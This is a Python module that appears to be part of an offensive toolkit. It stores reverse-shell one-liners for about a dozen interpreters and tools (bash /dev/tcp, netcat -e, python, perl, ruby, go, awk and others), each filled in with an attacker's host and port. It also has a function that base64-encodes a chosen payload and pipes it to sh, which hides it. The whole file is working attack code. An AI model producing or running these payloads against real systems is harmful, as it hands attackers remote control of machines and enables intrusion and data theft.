import base64

PAYLOADS = {
    "python": """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'""",
    "python3": """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{host}",{port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'""",
    "netcat": """nc {host} {port} -e /bin/bash""",
    "bash": """bash -c 'bash -i >& /dev/tcp/{host}/{port} 0>&1'""",
    "perl": """perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"{host}:{port}");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'""",
    "curl": """C='curl -Ns telnet://{host}:{port}'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null""",
    "rustcat": """rcat connect -s sh {host} {port}""",
    "telnet": """TF=$(mktemp -u);mkfifo $TF && telnet {host} {port} 0<$TF | sh 1>$TF""",
    "zsh": """zsh -c 'zmodload zsh/net/tcp && ztcp {host} {port} && zsh >&$REPLY 2>&$REPLY 0>&$REPLY'""",
    "ruby": """ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("{host}",{port}))'""",
    "lua": """lua -e "require('socket');require('os');t=socket.tcp();t:connect('{host}','{port}');os.execute('sh -i <&3 >&3 2>&3');""",
    "go": """echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","{host}:{port}");cmd:=exec.Command("sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go""",
    "awk": """awk 'BEGIN {s = "/inet/tcp/0/{host}/{port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null"""
}


def default():
    return "netcat"


def names():
    return list(PAYLOADS.keys())


def has(name: str):
    return name in PAYLOADS


def get(name: str, host: str, port: int, encode: bool = False):
    payload = PAYLOADS.get(name).format(host=host, port=port)
    if encode:
        encoded = base64.b64encode(payload.encode()).decode()
        payload = f"echo \"{encoded}\" | base64 -d | sh"
    return payload
